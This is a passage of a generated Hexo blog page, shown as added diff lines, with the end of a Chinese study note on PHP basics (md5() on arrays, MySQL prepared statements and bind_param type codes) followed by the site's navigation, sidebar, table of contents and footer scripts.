+<li><code>md5()</code>：计算字符串的MD5散列，但是对数组计算值为空。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>PHP Mysql预处理语句</p>
+<ol>
+<li>预处理语句：创建 SQL 语句模板并发送到数据库。预留的值使用参数<code>?</code>标记 。</li>
+<li>数据库解析，编译，对SQL语句模板执行查询优化，并存储结果不输出。</li>
+<li>执行：将应用绑定的值传递给参数，数据库执行语句。如果参数值不一样还可以多次执行。</li>
+</ol>
+<ul>
+<li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 预处理及绑定</span></span><br><span class="line">$stmt = $conn-&gt;prepare(<span class="string">"INSERT INTO MyGuests (firstname, lastname, email) VALUES (?, ?, ?)"</span>);</span><br><span class="line">$stmt-&gt;bind_param(<span class="string">"sss"</span>, $firstname, $lastname, $email);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>bind_param</code>函数绑定了SQL的参数，‘sss’参数列处理其余参数的数据类型</p>
+<ul>
+<li>i——integer整型</li>
+<li>d——double双精度浮点型</li>
+<li>s——string字符串</li>
+<li>b——binary large object二进制大对象</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/05/Web安全实验——Web应用程序攻击和检查框架w3af/" rel="next" title="Web安全实验——Web应用程序攻击和检查框架w3af">
+                <i class="fa fa-chevron-left"></i> Web安全实验——Web应用程序攻击和检查框架w3af
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/07/11/Django项目——在线答疑系统整体流程概述/" rel="prev" title="Django项目——在线答疑系统整体流程概述">
+                Django项目——在线答疑系统整体流程概述 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Klaus</p>
+              <div class="site-description motion-element" itemprop="description">Tough time don't last, tough people do.</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">32</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/KlausMichael0" title="GitHub &rarr; https://github.com/KlausMichael0" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#第二章—Web开发基础知识"><span class="nav-number">1.</span> <span class="nav-text">第二章—Web开发基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#第一节–前端开发基础——HTML"><span class="nav-number">1.1.</span> <span class="nav-text">第一节–前端开发基础——HTML</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第二节–前端开发基础——JavaScript"><span class="nav-number">1.2.</span> <span class="nav-text">第二节–前端开发基础——JavaScript</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第三节–Web服务器端环境"><span class="nav-number">1.3.</span> <span class="nav-text">第三节–Web服务器端环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第四节–后端开发基础——SQL"><span class="nav-number">1.4.</span> <span class="nav-text">第四节–后端开发基础——SQL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#第五节–后端开发基础——PHP"><span class="nav-number">1.5.</span> <span class="nav-text">第五节–后端开发基础——PHP</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Klaus</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.0.1</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=7.0.1"></script>
+
+  <script src="/js/src/motion.js?v=7.0.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/affix.js?v=7.0.1"></script>
+
+  <script src="/js/src/schemes/pisces.js?v=7.0.1"></script>
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=7.0.1"></script>
+<script src="/js/src/post-details.js?v=7.0.1"></script>
+
+
+
+  
+
+
+  <script src="/js/src/next-boot.js?v=7.0.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
